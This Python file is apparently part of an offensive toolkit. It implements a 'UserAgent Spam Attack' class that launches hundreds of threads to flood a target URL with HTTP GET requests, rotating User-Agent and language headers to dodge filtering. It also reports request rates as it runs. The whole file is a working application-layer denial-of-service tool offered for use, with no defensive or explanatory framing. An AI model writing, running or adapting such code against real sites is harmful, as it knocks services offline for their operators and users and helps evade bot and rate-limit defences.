#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
UserAgent Spam Attack - Rotate through massive UserAgent list
Architect 01 - Professional Suite
"""

import requests
import threading
import time
import random
from colorama import Fore, Style
from core.utils.useragents import USER_AGENTS

class UserAgentSpam:
    """Spam with different User-Agents for each request"""
    
    def __init__(self, target_url, threads=300):
        self.target_url = target_url
        self.threads = threads
        self.running = True
        self.request_count = 0
        self.ua_index = 0
        self.ua_list = USER_AGENTS * 10  # Repeat list for more variety
        
    def attack_worker(self):
        """Worker thread rotating User-Agents"""
        session = requests.Session()
        
        while self.running:
            try:
                # Rotate User-Agent
                ua = random.choice(self.ua_list)
                
                headers = {
                    'User-Agent': ua,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': random.choice(['en-US,en;q=0.9', 'id-ID,id;q=0.8', 'en-GB,en;q=0.7']),
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                }
                
                response = session.get(self.target_url, headers=headers, timeout=5)
                
                self.request_count += 1
                
                if self.request_count % 100 == 0:
                    print(f"{Fore.GREEN}   ╰─❯ [{threading.current_thread().name}] UA: {ua[:30]}... | Status: {response.status_code}{Style.RESET_ALL}")
                
                # Small delay
                time.sleep(0.01)
                
            except Exception:
                # Recreate session on error
                session = requests.Session()
                time.sleep(0.1)
    
    def start(self):
        """Start the UserAgent spam attack"""
        print(f"{Fore.YELLOW}\n   ╰─❯ Starting UserAgent Spam on {self.target_url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   ╰─❯ Threads: {self.threads}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   ╰─❯ User-Agents: {len(self.ua_list)} variations{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}   ╰─❯ Press Ctrl+C to stop\n{Style.RESET_ALL}")
        
        # Disable SSL warnings
        requests.packages.urllib3.disable_warnings()
        
        # Start workers
        for i in range(self.threads):
            worker = threading.Thread(target=self.attack_worker, name=f"UA-{i+1}")
            worker.daemon = True
            worker.start()
        
        # Monitor
        try:
            last_count = 0
            while self.running:
                time.sleep(5)
                new_req = self.request_count - last_count
                last_count = self.request_count
                print(f"{Fore.CYAN}   ╰─❯ Total requests: {self.request_count} | Rate: {new_req/5:.1f} rps{Style.RESET_ALL}")
                
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Stop the attack"""
        self.running = False
        print(f"{Fore.RED}\n   ╰─❯ Stopping UserAgent Spam...{Style.RESET_ALL}")
        print(f"{Fore.RED}   ╰─❯ Total requests: {self.request_count}{Style.RESET_ALL}")
